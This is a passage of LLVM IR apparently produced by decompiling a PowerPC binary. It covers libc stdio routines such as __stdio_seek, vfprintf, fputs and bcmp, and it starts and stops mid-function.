  %v3_100152e8 = zext i16 %v2_100152e8 to i32
  %v1_100152ec = add i32 %v0_100152e8, 8
  %v2_100152ec = inttoptr i32 %v1_100152ec to i32*
  %v3_100152ec = load i32, i32* %v2_100152ec, align 4
  %v1_100152f0 = call i32 @__asm_rlwinm(i32 %v3_100152e8, i32 0, i32 26, i32 24)
  %v2_100152f0 = trunc i32 %v1_100152f0 to i16
  %v1_100152f4 = load i32, i32* @r31, align 4
  %v2_100152f4 = add i32 %v1_100152f4, 28
  %v3_100152f4 = inttoptr i32 %v2_100152f4 to i32*
  store i32 %v3_100152ec, i32* %v3_100152f4, align 4
  %v3_100152f8 = load i32, i32* @r31, align 4
  %v4_100152f8 = inttoptr i32 %v3_100152f8 to i16*
  store i16 %v2_100152f0, i16* %v4_100152f8, align 2
  %v0_100152fc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100152fc

dec_label_pc_100152fc:                            ; preds = %dec_label_pc_100152d4, %dec_label_pc_100152e8
  %v0_100152fc = phi i32 [ %v0_100152ac, %dec_label_pc_100152d4 ], [ %v0_100152fc.pre, %dec_label_pc_100152e8 ]
  %v1_100152fc = inttoptr i32 %v0_100152fc to i16*
  %v2_100152fc = load i16, i16* %v1_100152fc, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10015304 = or i16 %v2_100152fc, 1
  br label %dec_label_pc_10015308

dec_label_pc_10015308:                            ; preds = %dec_label_pc_100152c4, %dec_label_pc_100152fc
  %v2_10015308 = phi i32 [ %v0_100152c4, %dec_label_pc_100152c4 ], [ %v0_100152fc, %dec_label_pc_100152fc ]
  %storemerge.off0 = phi i16 [ %v1_100152cc, %dec_label_pc_100152c4 ], [ %v1_10015304, %dec_label_pc_100152fc ]
  %v3_10015308 = inttoptr i32 %v2_10015308 to i16*
  store i16 %storemerge.off0, i16* %v3_10015308, align 2
  store i32 %v0_10015284, i32* @r31, align 4
  %v0_1001531c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001531c

; uselistorder directives
  uselistorder i32 %v4_10015290, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 4, 0 }
  uselistorder i32 26, { 4, 1, 2, 3, 5, 6, 7, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 6, 3, 2, 1, 8, 7, 5, 4, 0 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10015308, { 1, 0 }
  uselistorder label %dec_label_pc_100152fc, { 1, 0 }
  uselistorder label %dec_label_pc_100152b8, { 1, 0 }
  uselistorder label %dec_label_pc_100152ac, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_10015320 = load i32, i32* @lr, align 4
  store i32 %v0_10015320, i32* %r0.global-to-local, align 4
  %v0_1001532c = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_10015338 = add i32 %arg1, 4
  %v2_10015338 = inttoptr i32 %v1_10015338 to i32*
  %v3_10015338 = load i32, i32* %v2_10015338, align 4
  %v2_1001533c = load i32, i32* %arg2, align 4
  %v1_10015340 = add i32 %tmp, 4
  %v2_10015340 = inttoptr i32 %v1_10015340 to i32*
  %v3_10015340 = load i32, i32* %v2_10015340, align 4
  store i32 268522312, i32* @lr, align 4
  %v4_10015344 = call i32 @__libc_lseek64(i32 %v3_10015338, i32 %v2_1001533c, i32 %v3_10015340, i32 %arg3)
  %v1_10015348 = icmp slt i32 %v4_10015344, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_10015348, label %dec_label_pc_10015360, label %dec_label_pc_10015354

dec_label_pc_10015354:                            ; preds = %entry
  %v1_10015354 = load i32, i32* @r31, align 4
  %v2_10015354 = inttoptr i32 %v1_10015354 to i32*
  store i32 %v4_10015344, i32* %v2_10015354, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1001535c = load i32, i32* @r31, align 4
  %v2_1001535c = add i32 %v1_1001535c, 4
  %v3_1001535c = inttoptr i32 %v2_1001535c to i32*
  store i32 %tmp, i32* %v3_1001535c, align 4
  %v0_10015360.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10015360

dec_label_pc_10015360:                            ; preds = %entry, %dec_label_pc_10015354
  %v0_10015360 = phi i32 [ %tmp, %entry ], [ %v0_10015360.pre, %dec_label_pc_10015354 ]
  store i32 %v0_10015320, i32* %r0.global-to-local, align 4
  store i32 %v0_1001532c, i32* @r31, align 4
  ret i32 %v0_10015360

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_lseek64, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_10015360, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10015384 = load i32, i32* @r3, align 4
  %v1_10015384 = add i32 %v0_10015384, 56
  store i32 %v1_10015384, i32* %r30.global-to-local, align 4
  %v0_1001538c = load i32, i32* @r4, align 4
  store i32 %v0_1001538c, i32* @r29, align 4
  store i32 %v0_10015384, i32* @r31, align 4
  %v1_10015398 = add i32 %v0_10015384, 52
  %v2_10015398 = inttoptr i32 %v1_10015398 to i32*
  %v3_10015398 = load i32, i32* %v2_10015398, align 4
  store i32 %v3_10015398, i32* @r28, align 4
  %v0_1001539c = load i32, i32* @r5, align 4
  store i32 %v0_1001539c, i32* @r27, align 4
  %v2_100153a0 = ptrtoint i32* %stack_var_-40 to i32
  %v3_100153a8 = icmp eq i32 %v3_10015398, 0
  br i1 %v3_100153a8, label %dec_label_pc_100153b4, label %dec_label_pc_100153c0

dec_label_pc_100153b4:                            ; preds = %entry
  %v4_100153b4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 %v1_10015384)
  %v0_100153b8 = load i32, i32* %r30.global-to-local, align 4
  store i32 268522432, i32* @lr, align 4
  %v1_100153bc = call i32 @pthread_mutex_lock(i32 %v0_100153b8)
  %v0_100153c0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100153c0

dec_label_pc_100153c0:                            ; preds = %entry, %dec_label_pc_100153b4
  %v0_100153c0 = phi i32 [ %v0_10015384, %entry ], [ %v0_100153c0.pre, %dec_label_pc_100153b4 ]
  %v1_100153c0 = inttoptr i32 %v0_100153c0 to i16*
  %v2_100153c0 = load i16, i16* %v1_100153c0, align 2
  %v3_100153c0 = zext i16 %v2_100153c0 to i32
  store i32 128, i32* @r4, align 4
  store i32 %v0_100153c0, i32* @r3, align 4
  store i32 -1, i32* @r30, align 4
  %v1_100153d0 = call i32 @__asm_rlwinm(i32 %v3_100153c0, i32 0, i32 24, i32 25)
  %v3_100153d4 = icmp eq i32 %v1_100153d0, 192
  br i1 %v3_100153d4, label %dec_label_pc_100153e8, label %dec_label_pc_100153dc

dec_label_pc_100153dc:                            ; preds = %dec_label_pc_100153c0
  store i32 268522464, i32* @lr, align 4
  %v0_100153dc = call i32 @__stdio_trans2w_o()
  %v3_100153e0 = icmp eq i32 %v0_100153dc, 0
  br i1 %v3_100153e0, label %dec_label_pc_100153e8, label %dec_label_pc_100153fc

dec_label_pc_100153e8:                            ; preds = %dec_label_pc_100153dc, %dec_label_pc_100153c0
  %v0_100153e8 = load i32, i32* @r29, align 4
  store i32 %v0_100153e8, i32* @r4, align 4
  %v0_100153ec = load i32, i32* @r27, align 4
  store i32 %v0_100153ec, i32* @r5, align 4
  %v0_100153f0 = load i32, i32* @r31, align 4
  store i32 %v0_100153f0, i32* @r3, align 4
  store i32 268522488, i32* @lr, align 4
  %v0_100153f4 = call i32 @_vfprintf_internal()
  store i32 %v0_100153f4, i32* @r30, align 4
  br label %dec_label_pc_100153fc

dec_label_pc_100153fc:                            ; preds = %dec_label_pc_100153dc, %dec_label_pc_100153e8
  %v0_100153fc = load i32, i32* @r28, align 4
  %v3_100153fc = icmp eq i32 %v0_100153fc, 0
  store i32 %v2_100153a0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  br i1 %v3_100153fc, label %dec_label_pc_1001540c, label %dec_label_pc_10015410

dec_label_pc_1001540c:                            ; preds = %dec_label_pc_100153fc
  store i32 268522512, i32* @lr, align 4
  %v0_1001540c = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_10015410

dec_label_pc_10015410:                            ; preds = %dec_label_pc_100153fc, %dec_label_pc_1001540c
  %v0_10015414 = load i32, i32* @r30, align 4
  ret i32 %v0_10015414

; uselistorder directives
  uselistorder i32 %v0_100153c0, { 1, 0 }
  uselistorder i32 %v0_10015384, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__stdio_trans2w_o, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10015410, { 1, 0 }
  uselistorder label %dec_label_pc_100153fc, { 1, 0 }
  uselistorder label %dec_label_pc_100153c0, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10015430 = call i32 @__asm_mfcr()
  %v1_10015438 = add i32 %arg2, 56
  store i32 %v1_10015438, i32* %r30.global-to-local, align 4
  store i32 %v0_10015430, i32* @r29, align 4
  %v2_10015450 = ptrtoint i32* %stack_var_-40 to i32
  %v1_10015454 = add i32 %arg2, 52
  %v2_10015454 = inttoptr i32 %v1_10015454 to i32*
  %v3_10015454 = load i32, i32* %v2_10015454, align 4
  %v3_10015460 = icmp eq i32 %v3_10015454, 0
  store i1 %v3_10015460, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10015460, label %dec_label_pc_10015468, label %dec_label_pc_10015474

dec_label_pc_10015468:                            ; preds = %entry
  %v4_10015468 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 %v1_10015438)
  %v0_1001546c = load i32, i32* %r30.global-to-local, align 4
  store i32 268522612, i32* @lr, align 4
  %v1_10015470 = call i32 @pthread_mutex_lock(i32 %v0_1001546c)
  %v0_10015474.pre = load i32, i32* @r31, align 4
  %v0_10015478.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10015474

dec_label_pc_10015474:                            ; preds = %entry, %dec_label_pc_10015468
  %v0_10015478 = phi i32 [ %v0_10015430, %entry ], [ %v0_10015478.pre, %dec_label_pc_10015468 ]
  %v0_10015474 = phi i32 [ %arg2, %entry ], [ %v0_10015474.pre, %dec_label_pc_10015468 ]
  store i32 268522624, i32* @lr, align 4
  %v2_1001547c = call i32 @__GI_fputs_unlocked(i32 %v0_10015478, i32 %v0_10015474)
  store i32 1, i32* @r4, align 4
  store i32 %v2_1001547c, i32* @r31, align 4
  store i32 %v2_10015450, i32* @r3, align 4
  %v0_1001548c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1001548c, label %dec_label_pc_10015490, label %dec_label_pc_10015494

dec_label_pc_10015490:                            ; preds = %dec_label_pc_10015474
  store i32 268522644, i32* @lr, align 4
  %v0_10015490 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10015498.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015494

dec_label_pc_10015494:                            ; preds = %dec_label_pc_10015474, %dec_label_pc_10015490
  %v0_10015498 = phi i32 [ %v2_1001547c, %dec_label_pc_10015474 ], [ %v0_10015498.pre, %dec_label_pc_10015490 ]
  %v1_100154a8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10015430)
  ret i32 %v0_10015498

; uselistorder directives
  uselistorder i32 %v0_10015430, { 1, 0, 2 }
  uselistorder i32 ()* @__pthread_cleanup_pop_restore, { 4, 5, 3, 1, 25, 24, 23, 22, 21, 20, 2, 0, 26, 32, 31, 6, 19, 17, 16, 15, 14, 13, 18, 12, 30, 11, 10, 29, 28, 27, 9, 8, 7 }
  uselistorder i32 (i32)* @pthread_mutex_lock, { 16, 18, 17, 12, 3, 11, 14, 13, 41, 40, 39, 38, 37, 36, 15, 0, 42, 54, 53, 22, 2, 1, 10, 9, 8, 35, 33, 32, 31, 30, 29, 34, 28, 46, 27, 26, 45, 44, 43, 25, 24, 23, 52, 51, 55, 7, 4, 56, 6, 5, 50, 49, 48, 47, 21, 20, 19 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_cleanup_push_defer, { 29, 27, 28, 31, 7, 8, 9, 10, 11, 12, 30, 32, 6, 0, 1, 26, 13, 15, 16, 17, 18, 19, 14, 20, 2, 21, 22, 3, 4, 5, 23, 24, 25 }
  uselistorder i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), { 5, 0, 14, 6, 7, 8, 9, 2, 10, 11, 3, 15, 16, 12, 17, 1, 4, 18, 19, 13, 21, 20 }
  uselistorder i32 52, { 16, 14, 15, 13, 18, 7, 10, 6, 17, 11, 12, 5, 1, 2, 3, 4, 0, 8, 9 }
  uselistorder i32 56, { 16, 14, 15, 2, 3, 4, 21, 10, 9, 11, 8, 17, 1, 12, 13, 7, 0, 5, 6, 18, 19, 20 }
  uselistorder label %dec_label_pc_10015494, { 1, 0 }
  uselistorder label %dec_label_pc_10015474, { 1, 0 }
}

define i32 @bcmp(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v2_100154b4 = icmp ugt i32 %arg1, 15
  %v3_100154b4 = icmp eq i32 %arg1, 15
  store i1 %v3_100154b4, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg1, i32* @r31, align 4
  br i1 %v2_100154b4, label %dec_label_pc_100154e8.preheader, label %dec_label_pc_1001579c

dec_label_pc_100154e8.preheader:                  ; preds = %entry
  %v0_100154e8.pre = load i32, i32* @r4, align 4
  %v0_100154f4.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100154e8

dec_label_pc_100154cc:                            ; preds = %dec_label_pc_100154e8
  %v1_100154cc = inttoptr i32 %v0_10015570 to i8*
  %v2_100154cc = load i8, i8* %v1_100154cc, align 1
  %v3_100154cc = zext i8 %v2_100154cc to i32
  store i32 %v3_100154cc, i32* %r9.global-to-local, align 4
  %v1_100154d0 = add i32 %v0_100154fc, -1
  store i32 %v1_100154d0, i32* @r31, align 4
  %v1_100154d4 = inttoptr i32 %v0_10015574 to i8*
  %v2_100154d4 = load i8, i8* %v1_100154d4, align 1
  %v3_100154d4 = zext i8 %v2_100154d4 to i32
  store i32 %v3_100154d4, i32* %r0.global-to-local, align 4
  %v1_100154d8 = add i32 %v0_10015570, 1
  %v1_100154dc = add i32 %v0_10015574, 1
  store i32 %v1_100154dc, i32* @r4, align 4
  %v2_100154e0 = sub nsw i32 %v3_100154cc, %v3_100154d4
  store i32 %v2_100154e0, i32* %r9.global-to-local, align 4
  %v4_100154e4 = icmp eq i8 %v2_100154cc, %v2_100154d4
  br i1 %v4_100154e4, label %dec_label_pc_100154e8, label %dec_label_pc_1001575c

dec_label_pc_100154e8:                            ; preds = %dec_label_pc_100154e8.preheader, %dec_label_pc_100154cc
  %v0_100154fc = phi i32 [ %arg1, %dec_label_pc_100154e8.preheader ], [ %v1_100154d0, %dec_label_pc_100154cc ]
  %v0_10015570 = phi i32 [ %v0_100154f4.pre, %dec_label_pc_100154e8.preheader ], [ %v1_100154d8, %dec_label_pc_100154cc ]
  %v0_10015574 = phi i32 [ %v0_100154e8.pre, %dec_label_pc_100154e8.preheader ], [ %v1_100154dc, %dec_label_pc_100154cc ]
  %v1_100154e8 = urem i32 %v0_10015574, 4
  store i32 %v1_100154e8, i32* %r0.global-to-local, align 4
  %v3_100154e8 = icmp eq i32 %v1_100154e8, 0
  store i32 %v0_10015574, i32* %r29.global-to-local, align 4
  br i1 %v3_100154e8, label %dec_label_pc_100154f4, label %dec_label_pc_100154cc

dec_label_pc_100154f4:                            ; preds = %dec_label_pc_100154e8
  %v1_100154f4 = urem i32 %v0_10015570, 4
  %v3_100154f4 = icmp eq i32 %v1_100154f4, 0
  store i32 %v0_10015570, i32* @r30, align 4
  %v1_100154fc = udiv i32 %v0_100154fc, 4
  store i32 %v1_100154fc, i32* %r9.global-to-local, align 4
  %v1_10015504 = urem i32 %v1_100154fc, 4
  store i32 %v1_10015504, i32* %r0.global-to-local, align 4
  br i1 %v3_100154f4, label %dec_label_pc_10015504, label %dec_label_pc_10015604

dec_label_pc_10015504:                            ; preds = %dec_label_pc_100154f4
  %v3_1001550c = icmp eq i32 %v1_10015504, 1
  store i1 %v3_1001550c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001550c, label %dec_label_pc_10015564, label %dec_label_pc_10015514

dec_label_pc_10015514:                            ; preds = %dec_label_pc_10015504
  %v1_1001550c = icmp eq i32 %v1_10015504, 0
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_1001550c, label %dec_label_pc_10015558, label %dec_label_pc_1001551c

dec_label_pc_1001551c:                            ; preds = %dec_label_pc_10015514
  %v3_1001551c = icmp eq i32 %v1_10015504, 3
  store i1 %v3_1001551c, i1* %cr7_eq.global-to-local, align 1
  %v1_10015520 = inttoptr i32 %v0_10015574 to i32*
  %v2_10015520 = load i32, i32* %v1_10015520, align 4
  %v1_10015524 = inttoptr i32 %v0_10015570 to i32*
  %v2_10015524 = load i32, i32* %v1_10015524, align 4
  store i32 %v2_10015524, i32* %r0.global-to-local, align 4
  br i1 %v3_1001551c, label %dec_label_pc_10015544, label %dec_label_pc_1001552c

dec_label_pc_1001552c:                            ; preds = %dec_label_pc_1001551c
  %v1_10015530 = add i32 %v0_10015570, -8
  store i32 %v2_10015520, i32* %r0.global-to-local, align 4
  %v1_10015538 = add i32 %v0_10015574, -8
  %v1_1001553c = add nuw nsw i32 %v1_100154fc, 2
  br label %dec_label_pc_100155b0

dec_label_pc_10015544:                            ; preds = %dec_label_pc_1001551c
  %v1_10015548 = add i32 %v0_10015570, -4
  %v1_1001554c = add i32 %v0_10015574, -4
  %v1_10015550 = add nuw nsw i32 %v1_100154fc, 1
  br label %dec_label_pc_100155a0

dec_label_pc_10015558:                            ; preds = %dec_label_pc_10015514
  %v1_10015558 = inttoptr i32 %v0_10015570 to i32*
  %v2_10015558 = load i32, i32* %v1_10015558, align 4
  store i32 %v2_10015558, i32* %r9.global-to-local, align 4
  %v1_1001555c = inttoptr i32 %v0_10015574 to i32*
  %v2_1001555c = load i32, i32* %v1_1001555c, align 4
  store i32 %v2_1001555c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10015588

dec_label_pc_10015564:                            ; preds = %dec_label_pc_10015504
  %v1_10015564 = inttoptr i32 %v0_10015570 to i32*
  %v2_10015564 = load i32, i32* %v1_10015564, align 4
  %v1_10015568 = add nsw i32 %v1_100154fc, -1
  %v1_1001556c = inttoptr i32 %v0_10015574 to i32*
  %v2_1001556c = load i32, i32* %v1_1001556c, align 4
  %v1_10015570 = add i32 %v0_10015570, 4
  %v1_10015574 = add i32 %v0_10015574, 4
  br label %dec_label_pc_10015578

dec_label_pc_10015578:                            ; preds = %dec_label_pc_100155d0, %dec_label_pc_10015564
  %v0_100155c860 = phi i32 [ %v1_100155c8, %dec_label_pc_100155d0 ], [ %v1_10015568, %dec_label_pc_10015564 ]
  %v0_1001557c = phi i32 [ %v1_100155d0, %dec_label_pc_100155d0 ], [ %v1_10015570, %dec_label_pc_10015564 ]
  %v1_10015578 = phi i32 [ %v3_100155b8, %dec_label_pc_100155d0 ], [ %v2_1001556c, %dec_label_pc_10015564 ]
  %v0_10015578 = phi i32 [ %v3_100155b4, %dec_label_pc_100155d0 ], [ %v2_10015564, %dec_label_pc_10015564 ]
  %storemerge1 = phi i32 [ %v1_100155d4, %dec_label_pc_100155d0 ], [ %v1_10015574, %dec_label_pc_10015564 ]
  %v4_10015578 = icmp eq i32 %v0_10015578, %v1_10015578
  store i1 %v4_10015578, i1* %cr7_eq.global-to-local, align 1
  %v1_1001557c = inttoptr i32 %v0_1001557c to i32*
  %v2_1001557c = load i32, i32* %v1_1001557c, align 4
  store i32 %v2_1001557c, i32* %r9.global-to-local, align 4
  %v1_10015580 = inttoptr i32 %storemerge1 to i32*
  %v2_10015580 = load i32, i32* %v1_10015580, align 4
  store i32 %v2_10015580, i32* %r0.global-to-local, align 4
  br i1 %v4_10015578, label %dec_label_pc_10015588, label %dec_label_pc_100155ec

dec_label_pc_10015588:                            ; preds = %dec_label_pc_10015578, %dec_label_pc_10015558
  %v0_100155c859 = phi i32 [ %v0_100155c860, %dec_label_pc_10015578 ], [ %v1_100154fc, %dec_label_pc_10015558 ]
  %v0_10015590 = phi i32 [ %storemerge1, %dec_label_pc_10015578 ], [ %v0_10015574, %dec_label_pc_10015558 ]
  %v0_1001558c = phi i32 [ %v0_1001557c, %dec_label_pc_10015578 ], [ %v0_10015570, %dec_label_pc_10015558 ]
  %v1_10015598 = phi i32 [ %v2_10015580, %dec_label_pc_10015578 ], [ %v2_1001555c, %dec_label_pc_10015558 ]
  %v0_10015598 = phi i32 [ %v2_1001557c, %dec_label_pc_10015578 ], [ %v2_10015558, %dec_label_pc_10015558 ]
  %v4_10015588 = icmp eq i32 %v0_10015598, %v1_10015598
  store i1 %v4_10015588, i1* %cr7_eq.global-to-local, align 1
  %v1_1001558c = add i32 %v0_1001558c, 4
  %v2_1001558c = inttoptr i32 %v1_1001558c to i32*
  %v3_1001558c = load i32, i32* %v2_1001558c, align 4
  %v1_10015590 = add i32 %v0_10015590, 4
  %v2_10015590 = inttoptr i32 %v1_10015590 to i32*
  %v3_10015590 = load i32, i32* %v2_10015590, align 4
  br i1 %v4_10015588, label %dec_label_pc_100155a0, label %dec_label_pc_10015598

dec_label_pc_10015598:                            ; preds = %dec_label_pc_10015588
  %v3_10015598 = icmp ugt i32 %v0_10015598, %v1_10015598
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10015598, label %dec_label_pc_100155f8, label %dec_label_pc_100155f0

dec_label_pc_100155a0:                            ; preds = %dec_label_pc_10015588, %dec_label_pc_10015544
  %v0_100155c858 = phi i32 [ %v0_100155c859, %dec_label_pc_10015588 ], [ %v1_10015550, %dec_label_pc_10015544 ]
  %v0_100155a8 = phi i32 [ %v0_10015590, %dec_label_pc_10015588 ], [ %v1_1001554c, %dec_label_pc_10015544 ]
  %v0_100155a4 = phi i32 [ %v0_1001558c, %dec_label_pc_10015588 ], [ %v1_10015548, %dec_label_pc_10015544 ]
  %v1_100155a0 = phi i32 [ %v3_10015590, %dec_label_pc_10015588 ], [ %v2_10015520, %dec_label_pc_10015544 ]
  %v0_100155a0 = phi i32 [ %v3_1001558c, %dec_label_pc_10015588 ], [ %v2_10015524, %dec_label_pc_10015544 ]
  %v4_100155a0 = icmp eq i32 %v0_100155a0, %v1_100155a0
  store i1 %v4_100155a0, i1* %cr7_eq.global-to-local, align 1
  %v1_100155a4 = add i32 %v0_100155a4, 8
  %v2_100155a4 = inttoptr i32 %v1_100155a4 to i32*
  %v3_100155a4 = load i32, i32* %v2_100155a4, align 4
  %v1_100155a8 = add i32 %v0_100155a8, 8
  %v2_100155a8 = inttoptr i32 %v1_100155a8 to i32*
  %v3_100155a8 = load i32, i32* %v2_100155a8, align 4
  store i32 %v3_100155a8, i32* %r0.global-to-local, align 4
  br i1 %v4_100155a0, label %dec_label_pc_100155b0, label %dec_label_pc_100155ec

dec_label_pc_100155b0:                            ; preds = %dec_label_pc_100155a0, %dec_label_pc_1001552c
  %v0_100155c8 = phi i32 [ %v0_100155c858, %dec_label_pc_100155a0 ], [ %v1_1001553c, %dec_label_pc_1001552c ]
  %v0_100155d4 = phi i32 [ %v0_100155a8, %dec_label_pc_100155a0 ], [ %v1_10015538, %dec_label_pc_1001552c ]
  %v0_100155d0 = phi i32 [ %v0_100155a4, %dec_label_pc_100155a0 ], [ %v1_10015530, %dec_label_pc_1001552c ]
  %v1_100155c0 = phi i32 [ %v3_100155a8, %dec_label_pc_100155a0 ], [ %v2_10015520, %dec_label_pc_1001552c ]
  %v0_100155c0 = phi i32 [ %v3_100155a4, %dec_label_pc_100155a0 ], [ %v2_10015524, %dec_label_pc_1001552c ]
  %v4_100155b0 = icmp eq i32 %v0_100155c0, %v1_100155c0
  store i1 %v4_100155b0, i1* %cr7_eq.global-to-local, align 1
  %v1_100155b4 = add i32 %v0_100155d0, 12
  %v2_100155b4 = inttoptr i32 %v1_100155b4 to i32*
  %v3_100155b4 = load i32, i32* %v2_100155b4, align 4
  %v1_100155b8 = add i32 %v0_100155d4, 12
  %v2_100155b8 = inttoptr i32 %v1_100155b8 to i32*
  %v3_100155b8 = load i32, i32* %v2_100155b8, align 4
  br i1 %v4_100155b0, label %dec_label_pc_100155c8, label %dec_label_pc_100155c0

dec_label_pc_100155c0:                            ; preds = %dec_label_pc_100155b0
  %v3_100155c0 = icmp ugt i32 %v0_100155c0, %v1_100155c0
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100155c0, label %dec_label_pc_100155f8, label %dec_label_pc_100155f0

dec_label_pc_100155c8:                            ; preds = %dec_label_pc_100155b0
  %v1_100155c8 = add i32 %v0_100155c8, -4
  %v4_100155c8 = icmp eq i32 %v1_100155c8, 0
  br i1 %v4_100155c8, label %dec_label_pc_100155dc, label %dec_label_pc_100155d0

dec_label_pc_100155d0:                            ; preds = %dec_label_pc_100155c8
  %v1_100155d0 = add i32 %v0_100155d0, 16
  %v1_100155d4 = add i32 %v0_100155d4, 16
  br label %dec_label_pc_10015578

dec_label_pc_100155dc:                            ; preds = %dec_label_pc_100155c8
  %v4_100155dc = icmp eq i32 %v3_100155b4, %v3_100155b8
  store i1 %v4_100155dc, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v4_100155dc, label %dec_label_pc_10015750, label %dec_label_pc_100155ec

dec_label_pc_100155ec:                            ; preds = %dec_label_pc_100155dc, %dec_label_pc_10015578, %dec_label_pc_100155a0
  %v1_100155e8 = phi i32 [ %v3_100155b8, %dec_label_pc_100155dc ], [ %v1_10015578, %dec_label_pc_10015578 ], [ %v1_100155a0, %dec_label_pc_100155a0 ]
  %v0_100155e8 = phi i32 [ %v3_100155b4, %dec_label_pc_100155dc ], [ %v0_10015578, %dec_label_pc_10015578 ], [ %v0_100155a0, %dec_label_pc_100155a0 ]
  %v3_100155e8 = icmp ugt i32 %v0_100155e8, %v1_100155e8
  %v4_100155e8 = icmp eq i32 %v0_100155e8, %v1_100155e8
  store i1 %v4_100155e8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100155e8, label %dec_label_pc_100155f8, label %dec_label_pc_100155f0

dec_label_pc_100155f0:                            ; preds = %dec_label_pc_10015598, %dec_label_pc_100155c0, %dec_label_pc_100155ec
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10015750

dec_label_pc_100155f8:                            ; preds = %dec_label_pc_10015598, %dec_label_pc_100155c0, %dec_label_pc_100155ec
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10015750

dec_label_pc_10015604:                            ; preds = %dec_label_pc_100154f4
  %v1_10015608 = mul nuw nsw i32 %v1_100154f4, 8
  %v3_1001560c = icmp eq i32 %v1_10015504, 1
  store i1 %v3_1001560c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_100154fc, i32* %r6.global-to-local, align 4
  %v1_10015614 = call i32 @__asm_rlwinm(i32 %v0_10015570, i32 0, i32 0, i32 29)
  %v1_10015618 = sub nsw i32 32, %v1_10015608
  %v0_1001561c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001561c, label %dec_label_pc_1001567c, label %dec_label_pc_10015620

dec_label_pc_10015620:                            ; preds = %dec_label_pc_10015604
  %v0_10015620 = load i32, i32* %r0.global-to-local, align 4
  %v1_10015620 = icmp eq i32 %v0_10015620, 0
  %v3_10015620 = icmp eq i32 %v0_10015620, 1
  store i1 %v3_10015620, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10015620, label %dec_label_pc_1001566c, label %dec_label_pc_10015628

dec_label_pc_10015628:                            ; preds = %dec_label_pc_10015620
  %v3_10015628 = icmp eq i32 %v0_10015620, 3
  store i1 %v3_10015628, i1* %cr7_eq.global-to-local, align 1
  %v0_1001562c = load i32, i32* @r4, align 4
  %v1_1001562c = inttoptr i32 %v0_1001562c to i32*
  %v2_1001562c = load i32, i32* %v1_1001562c, align 4
  %v1_10015630 = inttoptr i32 %v1_10015614 to i32*
  %v2_10015630 = load i32, i32* %v1_10015630, align 4
  store i32 %v2_10015630, i32* %r0.global-to-local, align 4
  %v1_10015634 = add i32 %v1_10015614, 4
  %v2_10015634 = inttoptr i32 %v1_10015634 to i32*
  %v3_10015634 = load i32, i32* %v2_10015634, align 4
  store i32 %v3_10015634, i32* %r9.global-to-local, align 4
  br i1 %v3_10015628, label %dec_label_pc_10015654, label %dec_label_pc_1001563c

dec_label_pc_1001563c:                            ; preds = %dec_label_pc_10015628
  %v1_10015644 = add i32 %v1_10015614, -4
  %v1_10015648 = add i32 %v0_1001562c, -8
  %v0_1001564c = load i32, i32* %r6.global-to-local, align 4
